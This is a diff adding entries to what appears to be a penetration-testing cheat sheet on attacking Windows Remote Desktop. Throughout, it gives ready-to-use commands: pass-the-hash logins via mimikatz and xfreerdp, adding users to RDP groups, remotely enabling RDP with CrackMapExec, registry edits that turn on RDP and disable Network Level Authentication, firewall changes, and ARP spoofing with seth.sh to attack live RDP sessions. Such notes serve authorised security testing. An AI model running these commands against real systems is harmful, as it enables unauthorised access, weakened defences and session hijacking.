@@ -9,9 +9,28 @@ xfreerdp /d:<DOMAIN> /u:<VIC_USER> /v:<IP> /timeout:50000 +auto-reconnect /auto-
 # xfreerdp pth
 xfreerdp /u:<VIC_USER> /pth:<HASH> /v:<IP> /timeout:50000 +auto-reconnect /auto-reconnect-max-retries:0
 
+# RDP using mimikatz and PtH
+sekurlsa::pth /user:user /domain:domain.local /ntlm:<NTLM> /run:"mstsc.exe /restrictedadmin"
+
 # rdesktop (use if netlogon service is turned off)
 rdesktop -d <DOMAIN> -u <VIC_USER> -p <PASSWORD> <IP>
 
 # add user to rdp group
 net localgroup "Remote Management Users" <USERNAME> /add
 net localgroup "Remote Desktop Users" <USERNAME> /add
+
+# remotely enable RDP using CrackMapExec
+sudo crackmapexec smb <IP> -u <VIC_USER> -p <PASSWORD> -M rdp -o ACTION=enable
+
+# enable RDP from cmd.exe
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+# disable NLA (Network Layer Authentication) requirement for RDP
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+# enable RDP through the firewall
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
+
+# perform an ARP spoofing to attack existing RDP connections
+./seth.sh eth0 <IP attacker> <IP victim> <Gateway | Host>
